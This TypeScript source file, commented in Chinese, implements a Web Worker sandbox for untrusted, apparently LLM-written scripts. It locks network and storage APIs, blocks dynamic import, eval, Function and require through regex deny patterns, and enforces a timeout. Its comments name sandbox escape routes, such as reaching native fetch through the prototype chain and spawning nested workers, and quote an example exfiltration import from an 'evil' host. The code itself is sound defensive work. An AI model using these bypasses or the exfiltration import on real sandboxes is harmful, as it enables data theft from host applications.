/**
 * 通用 Web Worker 沙箱引擎(sandbox.ts)
 *
 * 从 dataSlotQuery.ts 抽出,作 eval_script 与 skill exec 的**单一真相源**(skill-external-scripts)。
 * 三层防护(整体迁移自 dataSlotQuery,不得拆散):
 *  1. 入口静态扫描 `SANDBOX_FORBIDDEN_PATTERNS`(动态 import/eval/Function/require 拒绝,防沙箱绕过与外泄)
 *  2. `lockSandboxGlobal`(defineProperty 锁网络/存储 API,防 `delete self.fetch` 恢复原生外泄;harden-eval-sandbox)
 *  3. 超时 terminate
 *
 * Worker 独立全局,无 window/document;入参经 structured clone 传入。
 * 外部沿用旧入口:dataSlotQuery.ts 的 `runSandboxedScript`/`EvalResult`/`lockSandboxGlobal` 均 re-export 自此处,import 路径不变。
 */
export interface SandboxResult {
  ok: boolean
  result?: unknown
  error?: string
  elapsedMs: number
}

/**
 * 锁定沙箱全局(Worker self)的网络/存储 API —— defineProperty configurable:false + writable:false。
 * 防逃逸(harden-eval-sandbox):旧实现赋值覆盖(self.fetch=...),Worker 脚本可 `delete self.fetch` 露出
 * 原生 fetch 外泄;锁后 delete/重新赋值均失败,**直接 self.fetch 不可达**。⚠️ **纵深防御层非绝对保证**:
 * 原型链 `Object.getPrototypeOf(self).fetch` 仍可达原生(此锁只遮蔽自有属性,不锁原型);但配合入口静态扫描
 * (拒 eval/Function/import)大幅抬高逃逸门槛,不可信脚本建议再加 CSP/受控源。纯函数可单测;
 * WORKER_PREAMBLE 经 toString() 注入 Worker 复用同一逻辑。
 * 注:eval/Function 不在此锁 —— Worker 内 new Function(建脚本 fn)依赖全局 Function,须先建 fn 再禁
 * (见 workerCode onmessage 顺序);逃逸者原型链取 Function 由网络 API 锁兜底(发不出数据)。
 */
export function lockSandboxGlobal(target: any): void {
  const lock = (name: string, value: unknown) => {
    try { Object.defineProperty(target, name, { configurable: false, writable: false, value }) } catch { /* 已不可配置则跳过 */ }
  }
  lock('fetch', () => { throw new Error('fetch 已被沙箱禁用') })
  lock('XMLHttpRequest', function () { throw new Error('XMLHttpRequest 已被沙箱禁用') })
  lock('importScripts', () => { throw new Error('importScripts 已被沙箱禁用') })
  lock('WebSocket', function () { throw new Error('WebSocket 已被沙箱禁用') })
  lock('indexedDB', undefined)   // 同源数据泄漏:Worker 可读写宿主同源 indexedDB/caches
  lock('caches', undefined)
  lock('Worker', undefined)      // 嵌套 worker 绕过:dedicated worker 内 new Worker 独立全局(其 fetch 未禁)
  lock('SharedWorker', undefined)
  lock('EventSource', undefined) // 其它同源/网络侧信道
  lock('BroadcastChannel', undefined)
  if (target.navigator) {
    try { Object.defineProperty(target.navigator, 'sendBeacon', { configurable: false, writable: false, value: () => { throw new Error('sendBeacon 已被沙箱禁用') } }) } catch {}
  }
}

// Worker 启动前注入:复用 lockSandboxGlobal(toString 序列化进 Worker,单一真相源;纯函数已单测)
const WORKER_PREAMBLE = `(${lockSandboxGlobal.toString()})(self);`

// 静态扫描禁用模式:动态 import() 是语法,Worker 运行时无法禁用(classic worker 支持 import() 拉外网 ES 模块),
// 只能在入口静态拦截,防 LLM 脚本 `import("https://evil/x.js")` 外泄 transform 拿到的 data。
// eval/Function/require 同列(动态执行可绕过静态扫描,双保险:运行时 workerCode 内 fn 创建后再禁 self.eval/self.Function)。
const SANDBOX_FORBIDDEN_PATTERNS: { re: RegExp; msg: string }[] = [
  { re: /\bimport\s*\(/, msg: '动态 import() 拉外网模块' },
  { re: /\bimport\s+[\w'"]/, msg: 'import 语句' },
  { re: /\beval\s*\(/, msg: 'eval() 动态执行' },
  { re: /\bFunction\s*\(/, msg: 'Function() 构造' },
  { re: /new\s+Function\b/, msg: 'new Function() 构造' },
  { re: /\brequire\s*\(/, msg: 'require() 拉模块' },
]

/**
 * 创建沙箱执行器(柯里化:先绑脚本 + 超时,再传可选入参)。
 *
 * - 无 `input`(skill exec 场景):workerCode 仍 `new Function("data", script)`,传 `undefined`,
 *   JS 多一个未用参数无害,**与原 runSandboxedScript 等价**。
 * - 有 `input`(eval_script 场景):作 `data` 入参 structured-clone 传 Worker。
 *
 * workerCode 三层防护(静态扫描在创建时即判;lockSandboxGlobal 经 WORKER_PREAMBLE 注入;超时 terminate)。
 */
export function createSandboxRunner(script: string, timeoutMs = 3000): (input?: unknown) => Promise<SandboxResult> {
  return async (input?: unknown): Promise<SandboxResult> => {
    // 入口静态扫描:拒绝含禁用模式的脚本(动态 import/eval/Function/require 防沙箱绕过与外泄)
    for (const { re, msg } of SANDBOX_FORBIDDEN_PATTERNS) {
      if (re.test(script)) {
        return { ok: false, error: `沙箱拒绝执行:脚本含禁用模式(${msg})`, elapsedMs: 0 }
      }
    }
    return new Promise((resolve) => {
      const start = Date.now()
      let done = false
      const finish = (r: Omit<SandboxResult, 'elapsedMs'>) => {
        if (done) return
        done = true
        clearTimeout(timer)
        try {
          worker.terminate()
        } catch {}
        URL.revokeObjectURL(url)
        resolve({ ...r, elapsedMs: Date.now() - start })
      }
      const workerCode =
        WORKER_PREAMBLE +
        '\nself.onmessage = async (e) => {\n' +
        '  try {\n' +
        '    const fn = new Function("data", e.data.script);\n' +
        '    try { self.eval = undefined; self.Function = undefined; } catch {}\n' +
        '    let result = fn(e.data.data);\n' +
        '    if (result && typeof result.then === "function") result = await result;\n' +
        '    self.postMessage({ ok: true, result });\n' +
        '  } catch (err) {\n' +
        '    self.postMessage({ ok: false, error: String((err && err.message) || err) });\n' +
        '  }\n' +
        '};'
      let url = '' // 空串初始:createObjectURL 失败时 catch 的 if(url) 为假,不 revoke(正确);成功后被覆盖
      let worker: Worker
      try {
        const blob = new Blob([workerCode], { type: 'application/javascript' })
        url = URL.createObjectURL(blob)
        worker = new Worker(url)
      } catch (e) {
        // createObjectURL 已成功但 new Worker 抛错:url 已分配需释放,防每次创建失败累积泄漏 blob URL
        if (url) URL.revokeObjectURL(url)
        resolve({ ok: false, error: `无法创建 Worker 沙箱: ${(e as Error).message}`, elapsedMs: 0 })
        return
      }
      const timer = setTimeout(() => finish({ ok: false, error: `脚本执行超时(${timeoutMs}ms),已终止` }), timeoutMs)
      worker.onmessage = (e: MessageEvent) => finish(e.data)
      worker.onerror = (e: ErrorEvent) => finish({ ok: false, error: e.message || 'Worker 运行错误' })
      try {
        worker.postMessage({ data: input, script })
      } catch (e) {
        finish({ ok: false, error: `数据无法传递给 Worker(可能含不可克隆值): ${(e as Error).message}` })
      }
    })
  }
}
